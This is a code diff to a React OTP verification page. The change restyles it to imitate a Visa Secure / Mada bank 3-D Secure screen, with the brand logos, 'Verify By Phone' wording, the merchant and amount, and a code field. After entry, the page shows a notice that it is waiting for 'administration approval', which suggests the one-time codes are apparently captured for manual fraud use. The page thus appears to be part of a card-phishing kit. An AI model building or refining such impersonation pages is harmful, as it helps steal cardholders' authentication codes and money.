@@ -166,161 +166,128 @@ const OTPVerification = () => {
       });
     }
   };
-  return <div className="min-h-screen bg-gradient-to-br from-background via-background to-muted/20">
+  return <div className="min-h-screen bg-white">
       <section className="pt-8 pb-16 px-4 md:px-6">
         <div className="container mx-auto max-w-2xl">
-          {/* Logo/Header */}
-          <div className="text-center mb-8">
-            <div className="inline-flex items-center justify-center w-20 h-20 rounded-full bg-primary/10 mb-4">
-              <Shield className="h-10 w-10 text-primary" />
+          {/* Header with logos */}
+          <div className="flex items-center justify-between mb-8 pb-6 border-b">
+            <div className="flex items-center gap-4">
+              <div className="text-2xl font-bold" style={{ color: '#003D82' }}>مدى</div>
             </div>
-            <h1 className="text-3xl md:text-4xl font-bold text-foreground mb-2">
-              تأكيد عملية الدفع
-            </h1>
-            <p className="text-muted-foreground">
-              {companyName}
-            </p>
+            <div className="flex flex-col items-end gap-2">
+              <button className="text-sm text-gray-600 hover:text-gray-800">Cancel</button>
+              <div className="flex items-center gap-2">
+                <span className="text-xl font-bold">VISA</span>
+                <div className="bg-[#003D82] text-white text-xs px-2 py-1 rounded">SECURE</div>
+              </div>
+            </div>
           </div>
 
-          {/* Payment Amount Card */}
-          <Card className="mb-6 p-6 bg-gradient-to-r from-primary/5 to-primary/10 border-primary/20">
-            <div className="flex items-center justify-between">
-              <div className="space-y-1">
-                <p className="text-sm text-muted-foreground">المبلغ الإجمالي</p>
-                <p className="text-3xl md:text-4xl font-bold text-foreground">{price} ﷼</p>
-              </div>
-              <div className="w-16 h-16 rounded-full bg-primary/20 flex items-center justify-center">
-                <CheckCircle2 className="h-8 w-8 text-primary" />
-              </div>
-            </div>
-          </Card>
-
-          {/* Main OTP Card */}
-          <Card className="p-8 md:p-10 shadow-lg border-2">
-            <div className="space-y-6">
-              {/* Title */}
-              <div className="text-center space-y-3">
-                <div className="inline-flex items-center justify-center w-16 h-16 rounded-full bg-muted mb-2">
-                  <span className="text-3xl">📱</span>
-                </div>
-                <h2 className="text-2xl md:text-3xl font-bold text-foreground">
-                  أدخل رمز التحقق
-                </h2>
-                <p className="text-sm text-muted-foreground leading-relaxed max-w-md mx-auto">
-                  تم إرسال رمز التحقق برسالة نصية إلى رقم الهاتف الخاص بالبطاقة الائتمانية
-                  {maskedCardNumber && (
-                    <>
-                      <br />
-                      <span className="font-mono text-base font-semibold text-foreground mt-2 inline-block" dir="ltr">
-                        {maskedCardNumber}
-                      </span>
-                    </>
-                  )}
-                </p>
-              </div>
-
-              {/* OTP Input Section */}
-              <div className="space-y-4 pt-4">
-                <div className="text-center">
-                  <label className="text-base font-semibold text-foreground block mb-3">
-                    رمز التحقق (4 أو 6 أرقام)
-                  </label>
-                </div>
-
-                <div className="max-w-sm mx-auto">
-                  <Input
-                    type="text"
-                    inputMode="numeric"
-                    maxLength={6}
-                    value={otp}
-                    onChange={handleOtpChange}
-                    placeholder="أدخل الرمز"
-                    className="h-16 text-center text-3xl font-bold tracking-[0.5em] border-2 rounded-xl focus:border-primary focus:ring-2 focus:ring-primary/20 bg-muted/30"
-                    dir="ltr"
-                  />
-                  <div className="flex justify-between items-center mt-2 px-2">
-                    <p className="text-xs text-muted-foreground">
-                      {otp.length > 0 ? `${otp.length} من 6` : ""}
-                    </p>
-                    {otp.length >= 4 && (
-                      <CheckCircle2 className="h-4 w-4 text-green-500 animate-scale-in" />
-                    )}
-                  </div>
-                </div>
-              </div>
-
-              {/* Timer Section */}
-              <div className="text-center py-4">
-                {canResend ? (
-                  <button
-                    onClick={handleResendOtp}
-                    className="inline-flex items-center gap-2 text-primary hover:text-primary/80 font-semibold text-base transition-colors group"
-                  >
-                    <RefreshCw className="h-4 w-4 group-hover:rotate-180 transition-transform duration-500" />
-                    إعادة إرسال الرمز
-                  </button>
-                ) : (
-                  <div className="space-y-1">
-                    <p className="text-sm text-muted-foreground">
-                      يمكنك إعادة إرسال الرمز بعد
-                    </p>
-                    <div className="inline-flex items-center justify-center w-20 h-20 rounded-full bg-muted">
-                      <span className="font-mono text-2xl font-bold text-foreground">
-                        {formatTime(timer)}
-                      </span>
-                    </div>
-                  </div>
-                )}
-              </div>
-
-              {/* Continue Button */}
-              <Button
-                onClick={handleVerify}
-                disabled={isVerifying || waitingForApproval || otp.length < 4}
-                size="lg"
-                className="w-full h-14 text-lg font-bold rounded-xl bg-primary hover:bg-primary/90 transition-all duration-300 hover:scale-[1.02] disabled:hover:scale-100 disabled:opacity-50"
-              >
-                {isVerifying ? (
-                  <>
-                    <Loader2 className="ml-2 h-5 w-5 animate-spin" />
-                    جاري التحقق...
-                  </>
-                ) : waitingForApproval ? (
-                  <>
-                    <Loader2 className="ml-2 h-5 w-5 animate-spin" />
-                    في انتظار الموافقة...
-                  </>
-                ) : (
-                  <>
-                    متابعة
-                    <CheckCircle2 className="mr-2 h-5 w-5" />
-                  </>
-                )}
-              </Button>
-
-              {waitingForApproval && (
-                <div className="mt-4 p-4 bg-yellow-50 dark:bg-yellow-950/20 border border-yellow-200 dark:border-yellow-800 rounded-lg">
-                  <p className="text-sm text-yellow-800 dark:text-yellow-200 text-center">
-                    🕐 يرجى الانتظار... تم إرسال كود التحقق وننتظر موافقة الإدارة
-                  </p>
-                </div>
-              )}
-
-              {/* Security Note */}
-              <div className="text-center pt-4 border-t">
-                <p className="text-xs text-muted-foreground flex items-center justify-center gap-2">
-                  <Shield className="h-3 w-3" />
-                  جميع المعاملات محمية ومشفرة
-                </p>
-              </div>
-            </div>
-          </Card>
-
-          {/* Additional Info */}
-          <div className="mt-6 text-center space-y-2">
-            <p className="text-xs text-muted-foreground">
-              في حالة عدم استلام الرمز، يرجى التحقق من رسائل البريد المزعج
+          {/* Main Content */}
+          <div className="space-y-6">
+            <h1 className="text-2xl font-semibold text-gray-900">
+              Verify By Phone
+            </h1>
+            
+            <p className="text-base text-gray-700">
+              We have sent you a text message with a code to your registered mobile number.
             </p>
+            
+            <p className="text-base text-gray-700">
+              You are paying {companyName} the amount of {price} ر.س on {new Date().toLocaleString('en-GB', { 
+                year: 'numeric', 
+                month: '2-digit', 
+                day: '2-digit',
+                hour: '2-digit',
+                minute: '2-digit',
+                second: '2-digit'
+              }).replace(',', '')}.
+            </p>
+
+            {/* OTP Input */}
+            <div className="space-y-3 pt-8">
+              <label className="text-sm text-gray-600 block">
+                Verification code
+              </label>
+              <Input
+                type="text"
+                inputMode="numeric"
+                maxLength={6}
+                value={otp}
+                onChange={handleOtpChange}
+                className="h-12 text-lg border-gray-300 rounded focus:border-blue-600 focus:ring-1 focus:ring-blue-600 bg-white"
+                dir="ltr"
+                disabled={waitingForApproval}
+              />
+            </div>
+
+            {/* Confirm Button */}
+            <Button
+              onClick={handleVerify}
+              disabled={isVerifying || waitingForApproval || otp.length < 4}
+              className="w-full h-12 text-base font-semibold rounded bg-blue-600 hover:bg-blue-700 text-white disabled:opacity-50 disabled:cursor-not-allowed"
+            >
+              {isVerifying ? (
+                <>
+                  <Loader2 className="ml-2 h-5 w-5 animate-spin" />
+                  جاري التحقق...
+                </>
+              ) : waitingForApproval ? (
+                <>
+                  <Loader2 className="ml-2 h-5 w-5 animate-spin" />
+                  في انتظار الموافقة...
+                </>
+              ) : (
+                "CONFIRM"
+              )}
+            </Button>
+
+            {/* Resend Code */}
+            <div className="text-center pt-4">
+              {canResend ? (
+                <button
+                  onClick={handleResendOtp}
+                  className="text-blue-600 hover:text-blue-800 font-medium text-base underline"
+                >
+                  RESEND CODE
+                </button>
+              ) : (
+                <p className="text-sm text-gray-500">
+                  يمكنك إعادة إرسال الرمز بعد {formatTime(timer)}
+                </p>
+              )}
+            </div>
+
+            {waitingForApproval && (
+              <div className="mt-4 p-4 bg-yellow-50 border border-yellow-200 rounded">
+                <p className="text-sm text-yellow-800 text-center">
+                  🕐 يرجى الانتظار... تم إرسال كود التحقق وننتظر موافقة الإدارة
+                </p>
+              </div>
+            )}
+
+            {/* Help Links */}
+            <div className="pt-8 space-y-3 border-t">
+              <details className="group">
+                <summary className="flex items-center justify-between cursor-pointer text-blue-600 hover:text-blue-800 text-base font-medium">
+                  Learn more about authentication
+                  <span className="text-xl group-open:rotate-45 transition-transform">+</span>
+                </summary>
+                <div className="mt-3 text-sm text-gray-600">
+                  التحقق من الهاتف هو طبقة أمان إضافية لحماية معاملاتك المالية.
+                </div>
+              </details>
+              
+              <details className="group">
+                <summary className="flex items-center justify-between cursor-pointer text-blue-600 hover:text-blue-800 text-base font-medium">
+                  Need some help ?
+                  <span className="text-xl group-open:rotate-45 transition-transform">+</span>
+                </summary>
+                <div className="mt-3 text-sm text-gray-600">
+                  إذا واجهت أي مشكلة، يرجى التواصل مع خدمة العملاء.
+                </div>
+              </details>
+            </div>
           </div>
         </div>
       </section>
